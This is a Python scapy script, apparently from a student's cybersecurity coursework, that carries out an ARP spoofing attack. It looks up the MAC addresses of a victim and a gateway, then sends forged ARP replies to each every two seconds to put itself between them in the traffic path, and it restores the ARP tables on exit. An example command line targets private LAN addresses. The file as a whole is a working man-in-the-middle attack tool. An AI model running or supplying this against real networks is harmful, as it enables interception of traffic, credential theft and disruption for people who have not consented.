from scapy.all import *
import time
import sys
import signal
import argparse
#cd /home/marwa/Desktop/Cyber
#sudo python3 "arp - Copie.py" -v 192.168.1.12 -g 192.168.1.1 -i wlan0


# Get MAC address of target IP
def get_mac(ip, iface):
    arp_req = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast / arp_req
    answered = srp(arp_req_broadcast, timeout=2, iface=iface, verbose=0)[0]
    if answered:
        return answered[0][1].hwsrc
    else:
        return None

# Send fake ARP reply (poisoning)
def poison(target_ip, target_mac, spoof_ip, iface):
    arp_response = ARP(
        op=2,              # ARP reply
        pdst=target_ip,    # Victim IP
        hwdst=target_mac,  # Victim MAC
        psrc=spoof_ip      # Pretend to be this IP
    )
    send(arp_response, iface=iface, verbose=0)

# Restore original ARP table (true info)
def restore(target_ip, target_mac, source_ip, source_mac, iface):
    arp_response = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=source_ip,
        hwsrc=source_mac
    )
    send(arp_response, iface=iface, count=5, verbose=0)

# Handle Ctrl+C (SIGINT) to restore ARP tables before exit
def signal_handler(sig, frame):
    print("\n[+] Restoring ARP tables...")
    restore(args.victim, victim_mac, args.gateway, gateway_mac, args.interface)
    restore(args.gateway, gateway_mac, args.victim, victim_mac, args.interface)
    print("[+] Exiting...")
    sys.exit(0)

def main():
    global args, victim_mac, gateway_mac

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack Script")
    parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
    parser.add_argument("-m", "--victim-mac", required=False, help="Victim MAC address (optional)")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP address")
    parser.add_argument("-i", "--interface", required=True, help="Network Interface name (e.g., eth0)")
    args = parser.parse_args()
    if args.victim_mac:
        victim_mac = args.victim_mac
    else:
        victim_mac = get_mac(args.victim, args.interface)
    # Get MAC addresses
    #victim_mac = get_mac(args.victim, args.interface)
    gateway_mac = get_mac(args.gateway, args.interface)

    if not victim_mac:
        print("[-] Could not retrieve victim MAC addresses.  Are the IPs correct?")
        sys.exit(1)
        
    if not gateway_mac:
        print("[-] Could not retrieve gatway MAC addresses. Are the IPs correct?")
        sys.exit(1)

    print(f"[+] Victim MAC: {victim_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")

    # Handle CTRL+C
    signal.signal(signal.SIGINT, signal_handler)

    print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
    while True:
        poison(args.victim, victim_mac, args.gateway, args.interface)
        poison(args.gateway, gateway_mac, args.victim, args.interface)
        time.sleep(2)

# Only run the script if called directly (not imported)
if __name__ == "__main__":
    main()
